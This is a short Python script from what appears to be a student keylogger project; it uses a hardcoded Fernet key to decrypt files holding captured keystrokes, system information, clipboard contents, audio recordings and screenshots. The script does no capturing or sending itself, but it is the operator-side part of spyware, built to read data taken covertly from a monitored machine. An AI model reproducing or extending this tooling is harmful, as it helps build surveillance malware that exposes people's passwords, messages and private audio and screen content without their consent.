from cryptography.fernet import Fernet

key="Khy266-BwtgNtktnnxOotNzlCtZxGF_-iYYZVkz2Fec="

file_path="D:\\CYBERSECURITY PROJECT(KEYLOGGER)\\project"
extend="\\"


decrypt_path="D:\\CYBERSECURITY PROJECT(KEYLOGGER)\\cryptography"


merge_d=decrypt_path+ extend
merge_e=file_path+ extend


#encrypted files from project folder
keys_information_e="e_key_log.txt"
system_information_e="e_system_info.txt"
clipboard_information_e="e_clip.txt"
audio_information_e="e_audio.wav"
screenshort_information_e="e_screenshots.png"


# after decryption
keys_information_d="d_key_log.txt"
system_information_d="d_system_info.txt"
clipboard_information_d="d_clip.txt"
audio_information_d="d_audio.wav"
screenshort_information_d="d_screenshots.png"

encrypted_files=[merge_e+system_information_e, merge_e+clipboard_information_e,merge_e+keys_information_e, merge_e+audio_information_e, merge_e+screenshort_information_e]
decrypted_files=[merge_d+system_information_d, merge_d+clipboard_information_d, merge_d+keys_information_d, merge_d+audio_information_d, merge_d+screenshort_information_d]
count=0

for decrypting_file in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data=f.read()
    
    fernet=Fernet(key)
    decrypted=fernet.decrypt(data)

    with open(decrypted_files[count], 'wb') as f:
        f.write(decrypted)
    count+=1


